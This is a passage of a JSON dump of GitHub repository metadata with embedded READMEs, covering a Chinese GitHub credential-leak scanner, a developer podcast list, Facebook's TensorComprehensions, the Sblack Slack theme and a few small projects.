支持规则管理（github搜索规则及本地repos搜索规则）\n1. 支持github token管理和用户管理\n1. 支持在WEB中对扫描结果审核\n\n## 使用方法\n- 命令行参数如下：\n    1. web指令表示启动web管理端\n    1. scan指令表示只启动github搜索\n    1. scan -m local，表示只启动本地代码搜索功能\n    1. scan -m all，表示同时启动github代码搜索与本地Repos搜索功能\n\n![](http://docs.xsec.io/images/github/paper/usage.png)\n\n- 配置好conf/app.ini中的参数后使用WEB参数后启动WEB服务器。默认会监听到本地的8000端口，默认的管理员账户和密码分别为：`xsec`和`x@xsec.io`。\n![](http://docs.xsec.io/images/github/web.png)\n\n- 登录WEB管理端，录入github token、规则。\n![](http://docs.xsec.io/images/github/rules.png)\n\n- 启动搜索功能：\n\n![](http://docs.xsec.io/images/github/search.png)\n\n- 审核结果\n    1. github code搜索结果审核：\n![](http://docs.xsec.io/images/github/report1.png)\n    1. 本地repos详细搜索结果审核：\n![](http://docs.xsec.io/images/github/report2.png)\n","byteSize":1359},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":127},"createdAt":"2018-02-06T03:50:25Z","updatedAt":"2018-02-16T13:47:54Z","pushedAt":"2018-02-06T04:20:00Z","description":"github泄露扫描系统","subscribersCount":{"totalCount":10},"diskUsage":5048,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":2}}},"tags":{"totalCount":1},"releases":{"totalCount":1},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"sw-yx","followers":{"totalCount":52},"repositories":{"totalCount":127},"following":{"totalCount":67},"location":"New York","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":9},"websiteUrl":"swyx.io"},"repository":{"name":"awesome-dev-podcasts","primaryLanguage":null,"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":6,"readme_md":{"text":"# awesome-dev-podcasts\na curated list of awesome dev podcasts and why they are awesome. I don't like normal \"awesome\" lists because they are usually not well maintained and are typically placed without an explanation of awesome, so here i will actually go out on a limb and say what i think. i'm a webdev and former finance guy so those are my biases.\n\nlist started in response to [AMA with @lucidsif](https://github.com/sw-yx/ama/issues/3)\n\n_note: links are incomplete because i havent had the time to link stuff up, you're gonna wanna just punch them in to your podcatcher anyway_\n\n# Technical Podcasts\n\n## 1. Javascript\n\n- **Devchat.TV Master feed ([Javascript Jabber](https://devchat.tv/js-jabber), My JS Story)**: for some good interviews as well as picks\n- **[React Native Radio](https://devchat.tv/react-native-radio)**: for react native stuff\n- **[The React Podcast](https://www.spreaker.com/show/the-react-podcast)**: Michael Jackson's new podcast (not to be confused with React30)\n- **[JAMStack Radio](https://www.heavybit.com/library/podcasts/jamstack-radio/)**: Netlify/Heavybit marketing for the JAMStack idea\n- **[3 Minutes with Kent](https://www.briefs.fm/3-minutes-with-kent)**: Kent Dodds in 3 minutes\n- **[Egghead.io developer chats](https://egghead.simplecast.fm/)**: by egghead.io instructors\n- **[Syntax.fm](https://syntax.fm/)**: wes bos and scott tolinski are full of tasty treats and sicccccck picks\n- **[Adventures in Angular](https://devchat.tv/adv-in-angular)**: a weekly podcast dedicated to the Angular JavaScript framework and related technologies, tools, languages, and practices. Very goood interviews and great picks.\n\n## 2. Non JS Webdev Technical podcasts\n\n- **[The Changelog](https://changelog.com/)**: Interviews of Open Source people. I skip a lot of these but its good to keep tabs on the huge world outside of JS.\n- **[Codepen Radio](https://blog.codepen.io/radio/)**: The inside look at the technical decisions behind Codepen.io.\n- **[Shoptalk Show](http://shoptalkshow.com/)**: Chris Coiyer and Dave Rupert talk webdev.\n- **[Toolsday](http://www.toolsday.io/)**: Una Kravets (Bustle) and Chris Dhanaraj (Netflix) do 20 minutes of tech tools, tips, and tricks. Very packed with useful info.\n- **[Non Breaking Space Show](https://goodstuff.fm/nbsp/)**: good webdev guests\n- **[The New Stack](https://thenewstack.io/podcasts/)**: Devops/Cloud topics\n- **[Fixate on Code](https://soundcloud.com/fixateoncode)**: More good guests\n- **[GraphQL Radio](https://graphqlradio.com/)**: all about the GraphQL\n- **The Web Platform**: browser news\n- **[Elm Town](http://elmtown.audio/)**: A podcast about writing Web apps in the Elm language, and the people who make up the community\n- **[Reason Town](http://reason.town/)**: A podcast about writing Javascript with the Reason language, and the people who make up the community\n\n## 3. Non Webdev Technical podcasts\n\n- **[Coding Blocks](https://www.codingblocks.net/)**: Reading through and discussing coding style books.\n- **[Talk Python To Me](https://talkpython.fm/)**: does a great job of keeping python topics accessible. Stark contrast to the monotone of Podcast.__init__ (the other big python podcast)\n- **[Data Skeptic](https://dataskeptic.com/)**: Kyle Polich mansplains data science to his wife Linh Da and she constantly gives him shit.\n- **[Linear Digressions](http://lineardigressions.com/)**: Ben and Katie talk data science, usually with a lame pun\n- **[Not So Standard Deviations](http://nssdeviations.com/)**: Roger Peng (professor somewhere) and Hilary Parker (stitchfix) talk data science\n- **[LambdaCast](https://soundcloud.com/lambda-cast)**: functional programming for humans\n- **[Machine Learning Guide](http://ocdevel.com/podcasts/machine-learning)**: very intense topical coverage of ML topics\n- **[TWiMLAI](https://twimlai.com/): This Week In Machine Learning and AI**: Sam Charrington, THE AI/ML podcast, huge.\n- **[Mapping The Journey](https://www.mappingthejourney.com/)**: interviews with very very OG creators of tech\n- **[MS Dev Show](https://msdevshow.com)**: Carl and Jason interview people working on technology that Microsoft developers would find interesting\n\n# Enreprogrammer Podcasts\n\n- **[Startups for the Rest of Us](http://www.startupsfortherestofus.com/)**: Rob Walling, Cofounder of Drip, and Mike taber, founder of Bluetick\n- **Founder's Journey**: Josh Pigford of Baremetrics\n- **[Full Stack Radio](http://www.fullstackradio.com/)**: Adam Wathan\n- **Bootstrapped Web**: Brian Casel and Jordan Gal\n- **[Indie Hackers](https://www.indiehackers.com/)**: CSAllen is awesome\n\n# Crypto Podcasts\n\n- **[Explain Blockchain](https://explainblockchain.io/)**: audio essays on intro topics\n- **[The Bitcoin Podcast](https://thebitcoinpodcast.com/)**: Cello, Dee and Corey talk smack and talk sense about crypto.\n- **[Neocash Radio](http://neocashradio.com/)**: good news recap\n- **[Lets Talk Bitcoin](https://letstalkbitcoin.com/)**: non newbie, non price discussion of blockchain developments\n- **[Unchained](http://unchainedpodcast.co/)**: laura shin (ex forbes) on crypto\n\n# Nontechnical Podcasts\n\n- **Stanford DFJ ETL**: Stanford entrepreneurship talks\n- **[Psychology of Video Games](http://www.psychologyofgames.com/)**: studying addictiveness from the masters\n- **[Stack Overflow podcast](https://stackoverflow.blog/podcasts/)**: hilarious\n- **The Startup Chat**: sales/marketing quick hits\n- **[Zen Founder](https://zenfounder.com/)**: therapy sessions with Sherry and Rob Walling\n- **[Using Reflection](https://itunes.apple.com/us/podcast/using-reflection/id1294155220?mt=2)**: Mark Weiss talks to people about their tech careers\n- **[Impostor Syndrome](https://www.impostor-syndrome.org/)**: _Shameless self plug!_ long form stories of a panel of people before, during, and after a bootcamp\n- **[Second Career Devs](https://secondcareerdevs.com/)**: Kyle Shevlin talks to career changers into development\n\n# Generalist Podcasts (Nontechnical as well as Technical Content)\n\n- **[Software Engineering Daily](https://softwareengineeringdaily.com/)**: a wide variety of content from cloud to blockchain. very good intro pieces by Jeff Meyerson.\n- **[YCombinator](http://blog.ycombinator.com/category/podcast/)**: YC podcast, more inspirational than practical. recorded video also.\n- **[a16z](https://a16z.com/podcasts/)**: great topic choices from a16z\n- **[acquired.fm](http://www.acquired.fm/)**: about tech acquisitions and trends\n- **[The Bike Shed](http://bikeshed.fm/)**: Thoughtbot's podcast\n- **[China Tech Talk](http://chinatechtalk.libsyn.com/)**: covering China's tech scene\n- **[Command Line Heroes](https://www.redhat.com/en/command-line-heroes)**: Saron Yitbarek covers old tech stories\n- **The Economist: Babbage**: The Economist tech column for free\n- **[Exponent.fm](http://exponent.fm/)**: Ben Thompson talks about his weekly articles\n- **FreeCodeCamp podcast**: good FCC articles read aloud\n- **[Autonocast](http://www.autonocast.com/)**: covering our self driving future\n- **[Frontend Happy Hour](http://frontendhappyhour.com/)**: bunch of senior devs (Netflix, Atlassian, etc) drink and talk webdev\n\n# Dead Podcasts with good backlogs\n\n- **Javascript Air**: Kent dodds' old podcast with a ton of big guests\n- **React30**: Michael Jackson and Ryan Florence's old podcast about React\n- **This Developing Story**: Good guests\n- **Zero To Scale**: Ended entrepreneurship podcasts\n- **Fullstack Javascript podcast**: random list of JS tips\n- **Partially Derivative**: dead data science podcast by Chris and Vidya\n- **Product Hunt**: produc thunt podcast\n- **The Web Ahead**: by Jen Simmons\n\n\n# TODO: Recommended but havent listened\n\n- **[Soft Skills Engineering](https://softskills.audio/)**: \"Soft Skills Engineering is a weekly advice podcast for software developers. We answer questions about all the stuff you didn't realize you needed to know about being an engineer\"\n\n# Podcast Tools (from @BrianSchroer)\n\n* [Huffduffer](https://huffduffer.com/about): Build your own RSS podcast feed from .mp3 files found anywhere on the web (e.g. individual episodes of podcasts that you might not want to subscribe to)\n* [Programming Podcasts](https://twitter.com/progpodcasts) (@prodpodcasts) Twitter account: Tweets new episode announcements for several podcasts - Great way to discover new podcasts or episodes to listen to\n","byteSize":8352},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":131},"createdAt":"2018-02-06T14:32:41Z","updatedAt":"2018-02-15T06:24:25Z","pushedAt":"2018-02-10T13:44:53Z","description":"a curated list of awesome dev podcasts and why","subscribersCount":{"totalCount":11},"diskUsage":56,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":5},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":21}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"facebookresearch","repositories":{"totalCount":47},"location":null,"members":{"totalCount":13},"websiteUrl":""},"repository":{"name":"TensorComprehensions","primaryLanguage":{"name":"C++"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":false,"forkCount":35,"readme_md":{"text":"# ![Tensor Comprehensions](docs/source/_static/img/tc-logo-full-color-with-text-2.png)\n\nTensor Comprehensions (TC) is a fully-functional C++ library to *automatically* synthesize high-performance machine learning kernels using [Halide](https://github.com/halide/Halide), [ISL](http://isl.gforge.inria.fr/) and NVRTC or LLVM. TC additionally provides basic integration with Caffe2 and pybind11 bindings for use with python. We provide more details in our paper on [arXiv](https://arxiv.org/abs/1802.04730).\n\nThis library is designed to be highly portable, machine-learning-framework agnostic and only requires a simple tensor library with memory allocation, offloading and synchronization capabilities.\n\nFor now, we have integrated TC with the [Caffe2](https://github.com/caffe2/caffe2) and [ATen](https://github.com/pytorch/pytorch/tree/master/aten/src/ATen) tensor libraries.\n\n# A simple example\n\nThe following illustrates a short but powerful feature of the library: the capacity to JIT-compile high-performance machine learning kernels on demand, for specific sizes.\n\n```cpp\n  #include <ATen/ATen.h>\n  #include \"tc/aten/aten_compiler.h\"\n  #include \"tc/core/mapping_options.h\"\n\n  // 1. Define and setup the TC compilation unit with CUDA memory management backed by ATen.\n  std::string tc = R\"TC(\n  def TensorDot(float(N, C1, C2, H, W) I0, float(N, C2, C3, H, W) I1) -> (O) {\n    O(n, c1, c3, h, w) +=! I0(n, c1, c2, h, w) * I1(n, c2, c3, h, w)\n  })TC\";\n\n  // 2. Allocate tensors with random data\n  at::Tensor I0 = at::CUDA(at::kFloat).rand({32, 512, 8, 28, 28});\n  at::Tensor I1 = at::CUDA(at::kFloat).rand({32,   8, 2, 28, 28});\n  std::vector<at::Tensor> outputs;\n\n  // 3. Run autotuning with evolutionary search starting from a naive option\n  auto options = tc::MappingOptions::makeNaiveMappingOptions();\n  auto bestOption = autotune(cacheFilename, tc, \"TensorDot\", {I0, I1}, options, {options});\n\n  // 4. Compile and run the TC with the best option.\n  tc::ATenCompilationUnit atCompl;\n  atCompl.define(tc);\n  auto handle = atCompl.compile(\"TensorDot\", {I0, I1}, bestOption);\n  atCompl.run(\"TensorDot\", {I0, I1}, outputs, handle);\n\n  // 5. Perform precision checks against an ATen reference implementation\n  check({I0, I1}, outputs, [&I0, &I1](){ return ...; });\n```\n\nAfter a few generations of autotuning on a 2-GPU P100 system, we see results resembling:\n\n![Autotuning Sample](docs/source/_static/img/autotuning.png)\n\nWe have not yet characterized the precise fraction of peak performance we obtain but it is not uncommon to obtain 80%+ of peak shared memory bandwidth after autotuning. Solid register-level optimizations are still in the work but TC in its current form already addresses the productivity gap between the needs of research and the needs of production. Which is why we are excited to share it with the entire community and bring this collaborative effort in the open.\n\n# Installation / Documentation\nYou can find documentation [here](https://facebookresearch.github.io/TensorComprehensions/) which contains instructions for building TC via docker, conda packages or in non-conda environment.\n\n# Communication\n\n* **GitHub issues**: bug reports, feature requests, install issues, RFCs, thoughts, etc.\n* **Slack**: For discussion around framework integration, build support, collaboration, etc. join our slack channel https://tensorcomprehensions.herokuapp.com/.\n\n# Code of Conduct\nSee the [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) file for more details.\n\n# License\nTensor Comprehensions is distributed under a permissive Apache v2.0 license, see the [LICENSE](LICENSE) file for more details.\n\n# Contributing\nSee the [CONTRIBUTING.md](CONTRIBUTING.md) file for more details.\n","byteSize":3693},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":642},"createdAt":"2018-02-06T17:11:07Z","updatedAt":"2018-02-17T08:41:58Z","pushedAt":"2018-02-17T06:47:46Z","description":"A domain specific language to express machine learning workloads.","subscribersCount":{"totalCount":38},"diskUsage":3485,"pullRequestsOpen":{"totalCount":4},"pullRequestsClosed":{"totalCount":7},"pullRequestsMerged":{"totalCount":19},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":2},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"commits":{"totalCount":5}}},{"node":{"comments":{"totalCount":4},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":7},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":11},"numCommits":{"target":{"history":{"totalCount":42}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"frankdilo","followers":{"totalCount":36},"repositories":{"totalCount":25},"following":{"totalCount":41},"location":"Italy","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":1},"websiteUrl":"frankdilo.xyz"},"repository":{"name":"sblack","primaryLanguage":{"name":"CSS"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":8,"readme_md":{"text":"⚠️ Sblack is <strong>no longer available for download</strong> since the app is in violation of the Slack Acceptable Use Policy. It was fun while it lasted, sorry guys!\n\n# Sblack &nbsp;<img width=\"50px\" src=\"Github/icon.png\">\n\n> Sblack makes [Slack for Mac](https://slack.com/downloads/osx) easier on your eyes. \nJust drag and drop and you're done ✨\n> \n> Made for all the people that, like us, use Slack all day long.\n\nDeveloped by [Francesco Di Lorenzo](http://www.twitter.com/frankdilo) and designed by [Fabrizio Rinaldi](http://www.twitter.com/linuz90)\n\n\n## Install and Usage\n\n- ~Download Sblack~ (no longer available)\n- Open the app\n- Drag `Slack.app` onto it\n- Boom, done!\n\n## How to Contribute\n\nIf you want to improve the theme, this is the process:\n\n- Clone the repo\n- Install the theme\n- Open `/Applications/Slack/Contents/Resources/app.asar.unpacked/src/static/ssb-interop.js`\n- Down below in that file you will find the css that makes the theme\n- Edit it (relauch Slack.app to see the changes)\n- Report the edits to the css file in this repo\n\nYou can enable \"Inspect Element\" in Slack for Mac by launching the app this way from the terminal:\n\n```sh\nSLACK_DEVELOPER_MENU=1 /Applications/Slack.app\n```\n\n## Related\n\n- [Official Website](http://www.sblack.online)\n- [Slack Night Mode](https://github.com/laCour/slack-night-mode) - Original CSS used to make Slack dark.\n\n## Preview\n\n![](Github/preview.jpg)\n\n## License\n\nMIT © [Francesco Di Lorenzo](http://frankdilo.xyz)\n\n> Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n> \n> The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n> \n> THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n","byteSize":2517},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":103},"createdAt":"2018-02-05T20:28:45Z","updatedAt":"2018-02-13T13:00:13Z","pushedAt":"2018-02-09T07:21:15Z","description":"Black theme for Slack Mac","subscribersCount":{"totalCount":5},"diskUsage":1083,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":3},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":8},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":7},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":26}}},"tags":{"totalCount":10},"releases":{"totalCount":8},"type":"user"},"siteAdmin":"false"},{"user":{"login":"cd-dongzi","followers":{"totalCount":35},"repositories":{"totalCount":14},"following":{"totalCount":0},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"vue-project","primaryLanguage":{"name":"Vue"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":59,"readme_md":{"text":"# Vue实战项目篇\n\n**定期更新自己的一些小项目**","byteSize":62},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":124},"createdAt":"2018-02-05T13:25:36Z","updatedAt":"2018-02-13T07:13:04Z","pushedAt":"2018-02-13T17:01:35Z","description":"Vue实战项目","subscribersCount":{"totalCount":5},"diskUsage":234,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":4}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"reinink","followers":{"totalCount":249},"repositories":{"totalCount":11},"following":{"totalCount":14},"location":"Beamsville, Ontario","organizations":{"totalCount":6},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":8}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":13},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":6},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":10}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":7},"stargazers":{"totalCount":44}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":40},"websiteUrl":"https://reinink.ca"},"repository":{"name":"laracon2018","primaryLanguage":{"name":"PHP"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":18,"readme_md":null,"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":130},"createdAt":"2018-02-05T14:25:00Z","updatedAt":"2018-02-16T22:50:44Z","pushedAt":"2018-02-08T10:36:38Z","description":"Source code for my example app used in my Laracon Online 2018 talk","subscribersCount":{"totalCount":9},"diskUsage":190,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":22}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"gen2brain","followers":{"totalCount":50},"repositories":{"totalCount":32},"following":{"totalCount":1},"location":"Belgrade, Serbia","organizations":{"totalCount":1},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers"